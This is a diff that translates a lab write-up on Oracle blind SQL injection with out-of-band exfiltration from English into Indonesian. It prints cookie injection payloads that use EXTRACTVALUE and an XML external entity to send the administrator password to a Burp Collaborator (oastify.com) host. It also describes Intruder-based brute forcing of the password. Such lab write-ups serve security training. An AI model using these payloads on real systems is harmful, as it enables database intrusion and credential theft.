@@ -24,58 +24,93 @@ References:
 
 ---------------------------------------------
 
+# **Detail Query dan Penjelasan Eksploitasi Blind SQL Injection dengan Out-of-Band Data Exfiltration**
 
-The payload for out-of-band interaction is:
+### **Payload Utama**
+Payload awal untuk memicu interaksi Out-of-Band (OOB) dengan server Burp Collaborator adalah sebagai berikut:
 
-```
+```plaintext
 Cookie: TrackingId=FFyToxqSs49lpxuC'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
 ```
 
-We will try this:
+Payload ini memanfaatkan fungsi Oracle **`EXTRACTVALUE`** untuk memproses dokumen XML yang dirancang agar server melakukan DNS lookup ke domain Burp Collaborator.
 
-```
-SELECT CASE WHEN ((SUBSTR((SELECT password FROM users WHERE username = 'administrator'),1,1))='a') THEN 'a'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual) ELSE NULL END FROM dual
+---
+
+### **Langkah Eksploitasi dengan Data Retrieval**
+Untuk melakukan eksploitasi yang lebih kompleks, seperti mengambil data sensitif (misalnya, password), kita bisa menggunakan query seperti ini:
+
+```sql
+SELECT CASE WHEN ((SUBSTR((SELECT password FROM users WHERE username = 'administrator'),1,1))='a') 
+THEN 'a'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual) 
+ELSE NULL END 
+FROM dual
 ```
 
-```
+Payload ini akan memproses langkah berikut:
+1. **`SUBSTR((SELECT password FROM users WHERE username = 'administrator'),1,1)`**:
+   - Mengekstrak karakter pertama dari kolom `password` untuk user `administrator`.
+2. **`CASE WHEN ... THEN ... ELSE NULL`**:
+   - Jika karakter pertama adalah `'a'`, server akan mencoba mengakses URL Burp Collaborator.
+   - Jika tidak, tidak ada interaksi yang terjadi.
+3. **`EXTRACTVALUE`**:
+   - Memproses dokumen XML dengan deklarasi entitas eksternal untuk memicu DNS lookup.
+
+**Payload yang diterapkan ke cookie**:
+
+```plaintext
 FFyToxqSs49lpxuC'+union+SELECT+CASE+WHEN+((SUBSTR((SELECT+password+FROM+users+WHERE+username+=+'administrator'),1,1))!='a')+THEN+'a'||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://BURP-COLLABORATOR/">+%25remote%3b]>'),'/l')+FROM+dual)+ELSE+NULL+END+FROM+dual--;
 ```
 
-First I test it when the first character is different to “a” and see there is an interaction:
+---
 
+### **Hasil Pengujian**
+1. **Menggunakan Payload Pertama**:
+   - Tes dilakukan untuk memvalidasi apakah karakter pertama dari password bukan `'a'`.
+   - Interaksi dengan domain Burp Collaborator berhasil terjadi:
 
+   ![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/1.png)
 
-![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/1.png)
+   ![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/2.png)
 
+2. **Menggunakan Intruder**:
+   - Payload dikirim ke **Burp Intruder**.
+   - Posisi pertama diatur untuk karakter password, dan posisi kedua untuk subdomain Burp Collaborator.
+   - Mode **Battering Ram** digunakan untuk mencoba berbagai karakter secara otomatis:
 
+   ![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/3.png)
 
-![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/2.png)
+3. **Hasil Akhir**:
+   - Ditemukan bahwa karakter password adalah `'e'`:
 
-We send this to the Intruder and set two positions, one for the character for the comparison and the other the subdomain. We set the type to “Battering Ram”:
+   ![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/4.png)
 
+4. **Iterasi untuk Seluruh Password**:
+   - Dengan mencoba setiap karakter secara berurutan, password lengkap berhasil dieksfiltrasi: `e6jomps7kptnx04vcvtz`.
 
+---
 
-![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/3.png)
+### **Payload Alternatif untuk Data Retrieval**
+Payload ini menggunakan fitur Oracle untuk mengekstraksi data lebih lanjut:
 
-We find there was a query for the letter “e”:
-
-
-
-![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/4.png)
-
-Knowing this we could go character by character and get the password “e6jomps7kptnx04vcvtz”.
-
-We can also use the query in the cheat-sheet:
-
-```
+```sql
 SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
 ```
 
+Implementasi untuk mengambil seluruh password:
 
-```
+```plaintext
 mnsyvP6Ci68a0edP'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+where+username='administrator')||'.0mntiwqdq98x96mi2d97hujkwb22quej.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
 
+---
 
+### **Validasi Hasil**
+Ketika payload berhasil dieksekusi, server melakukan DNS lookup ke Burp Collaborator, membuktikan bahwa data telah dieksfiltrasi:
 
 ![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/5.png)
+
+---
+
+### **Kesimpulan**
+Payload ini memungkinkan eksploitasi Blind SQL Injection dengan teknik Out-of-Band untuk mengambil data sensitif dari server, memanfaatkan mekanisme DNS lookup untuk memvalidasi eksekusi query dan mengirimkan data.
